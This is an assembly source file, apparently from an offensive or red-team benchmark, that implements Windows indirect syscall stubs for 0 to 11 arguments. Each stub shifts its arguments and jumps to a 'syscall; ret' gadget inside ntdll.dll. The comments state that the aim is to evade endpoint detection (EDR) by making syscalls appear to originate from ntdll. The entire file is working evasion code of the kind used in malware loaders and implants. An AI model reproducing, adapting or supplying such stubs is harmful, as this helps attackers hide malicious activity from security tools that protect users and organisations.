# indirect_syscalls_asm.s — BM-T1004/T1005: Indirect Syscall Stubs (Generic)
# GAS (GNU Assembler) x64 — Intel syntax
#
# Same shift logic as the direct generic stubs, but the tail instruction
# jumps to a `syscall; ret` gadget inside ntdll.dll instead of executing
# syscall directly. This means:
#   - RIP during syscall points to ntdll (passes EDR validation)
#   - The gadget's `ret` pops OUR caller's return address
#   - Control returns directly to our caller — clean and transparent
#
# indirect_syscall_N(DWORD ssn, arg1, arg2, ..., argN)
#
# Supports 0-11 arguments (covers all known NT syscalls).

.intel_syntax noprefix

# =====================================================================
# Global State (.data section)
# =====================================================================

.data

# Gadget address lives in indirect_syscalls.c (RIP-relative jmp [rip+g_syscall_gadget]).
.extern g_syscall_gadget

# =====================================================================
# Generic Indirect Syscall Stubs (.text section)
# =====================================================================

.text

# indirect_syscall_0(DWORD ssn)
.globl indirect_syscall_0
indirect_syscall_0:
    mov eax, ecx
    mov r10, rcx
    jmp qword ptr [rip + g_syscall_gadget]

# indirect_syscall_1(DWORD ssn, void *arg1)
.globl indirect_syscall_1
indirect_syscall_1:
    mov eax, ecx
    mov r10, rdx
    jmp qword ptr [rip + g_syscall_gadget]

# indirect_syscall_2(DWORD ssn, void *arg1, void *arg2)
.globl indirect_syscall_2
indirect_syscall_2:
    mov eax, ecx
    mov r10, rdx
    mov rdx, r8
    jmp qword ptr [rip + g_syscall_gadget]

# indirect_syscall_3(DWORD ssn, void *arg1, void *arg2, void *arg3)
.globl indirect_syscall_3
indirect_syscall_3:
    mov eax, ecx
    mov r10, rdx
    mov rdx, r8
    mov r8, r9
    jmp qword ptr [rip + g_syscall_gadget]

# indirect_syscall_4(DWORD ssn, void *a1, ..., void *a4)
.globl indirect_syscall_4
indirect_syscall_4:
    mov eax, ecx
    mov r10, rdx
    mov rdx, r8
    mov r8, r9
    mov r9, qword ptr [rsp + 0x28]
    jmp qword ptr [rip + g_syscall_gadget]

# indirect_syscall_5(DWORD ssn, void *a1, ..., void *a5)
.globl indirect_syscall_5
indirect_syscall_5:
    mov eax, ecx
    mov r10, rdx
    mov rdx, r8
    mov r8, r9
    mov r9, qword ptr [rsp + 0x28]
    mov r11, qword ptr [rsp + 0x30]
    mov qword ptr [rsp + 0x28], r11
    jmp qword ptr [rip + g_syscall_gadget]

# indirect_syscall_6(DWORD ssn, void *a1, ..., void *a6)
.globl indirect_syscall_6
indirect_syscall_6:
    mov eax, ecx
    mov r10, rdx
    mov rdx, r8
    mov r8, r9
    mov r9, qword ptr [rsp + 0x28]
    mov r11, qword ptr [rsp + 0x30]
    mov qword ptr [rsp + 0x28], r11
    mov r11, qword ptr [rsp + 0x38]
    mov qword ptr [rsp + 0x30], r11
    jmp qword ptr [rip + g_syscall_gadget]

# indirect_syscall_7(DWORD ssn, void *a1, ..., void *a7)
.globl indirect_syscall_7
indirect_syscall_7:
    mov eax, ecx
    mov r10, rdx
    mov rdx, r8
    mov r8, r9
    mov r9, qword ptr [rsp + 0x28]
    mov r11, qword ptr [rsp + 0x30]
    mov qword ptr [rsp + 0x28], r11
    mov r11, qword ptr [rsp + 0x38]
    mov qword ptr [rsp + 0x30], r11
    mov r11, qword ptr [rsp + 0x40]
    mov qword ptr [rsp + 0x38], r11
    jmp qword ptr [rip + g_syscall_gadget]

# indirect_syscall_8(DWORD ssn, void *a1, ..., void *a8)
.globl indirect_syscall_8
indirect_syscall_8:
    mov eax, ecx
    mov r10, rdx
    mov rdx, r8
    mov r8, r9
    mov r9, qword ptr [rsp + 0x28]
    mov r11, qword ptr [rsp + 0x30]
    mov qword ptr [rsp + 0x28], r11
    mov r11, qword ptr [rsp + 0x38]
    mov qword ptr [rsp + 0x30], r11
    mov r11, qword ptr [rsp + 0x40]
    mov qword ptr [rsp + 0x38], r11
    mov r11, qword ptr [rsp + 0x48]
    mov qword ptr [rsp + 0x40], r11
    jmp qword ptr [rip + g_syscall_gadget]

# indirect_syscall_9(DWORD ssn, void *a1, ..., void *a9)
.globl indirect_syscall_9
indirect_syscall_9:
    mov eax, ecx
    mov r10, rdx
    mov rdx, r8
    mov r8, r9
    mov r9, qword ptr [rsp + 0x28]
    mov r11, qword ptr [rsp + 0x30]
    mov qword ptr [rsp + 0x28], r11
    mov r11, qword ptr [rsp + 0x38]
    mov qword ptr [rsp + 0x30], r11
    mov r11, qword ptr [rsp + 0x40]
    mov qword ptr [rsp + 0x38], r11
    mov r11, qword ptr [rsp + 0x48]
    mov qword ptr [rsp + 0x40], r11
    mov r11, qword ptr [rsp + 0x50]
    mov qword ptr [rsp + 0x48], r11
    jmp qword ptr [rip + g_syscall_gadget]

# indirect_syscall_10(DWORD ssn, void *a1, ..., void *a10)
.globl indirect_syscall_10
indirect_syscall_10:
    mov eax, ecx
    mov r10, rdx
    mov rdx, r8
    mov r8, r9
    mov r9, qword ptr [rsp + 0x28]
    mov r11, qword ptr [rsp + 0x30]
    mov qword ptr [rsp + 0x28], r11
    mov r11, qword ptr [rsp + 0x38]
    mov qword ptr [rsp + 0x30], r11
    mov r11, qword ptr [rsp + 0x40]
    mov qword ptr [rsp + 0x38], r11
    mov r11, qword ptr [rsp + 0x48]
    mov qword ptr [rsp + 0x40], r11
    mov r11, qword ptr [rsp + 0x50]
    mov qword ptr [rsp + 0x48], r11
    mov r11, qword ptr [rsp + 0x58]
    mov qword ptr [rsp + 0x50], r11
    jmp qword ptr [rip + g_syscall_gadget]

# indirect_syscall_11(DWORD ssn, void *a1, ..., void *a11)
.globl indirect_syscall_11
indirect_syscall_11:
    mov eax, ecx
    mov r10, rdx
    mov rdx, r8
    mov r8, r9
    mov r9, qword ptr [rsp + 0x28]
    mov r11, qword ptr [rsp + 0x30]
    mov qword ptr [rsp + 0x28], r11
    mov r11, qword ptr [rsp + 0x38]
    mov qword ptr [rsp + 0x30], r11
    mov r11, qword ptr [rsp + 0x40]
    mov qword ptr [rsp + 0x38], r11
    mov r11, qword ptr [rsp + 0x48]
    mov qword ptr [rsp + 0x40], r11
    mov r11, qword ptr [rsp + 0x50]
    mov qword ptr [rsp + 0x48], r11
    mov r11, qword ptr [rsp + 0x58]
    mov qword ptr [rsp + 0x50], r11
    mov r11, qword ptr [rsp + 0x60]
    mov qword ptr [rsp + 0x58], r11
    jmp qword ptr [rip + g_syscall_gadget]
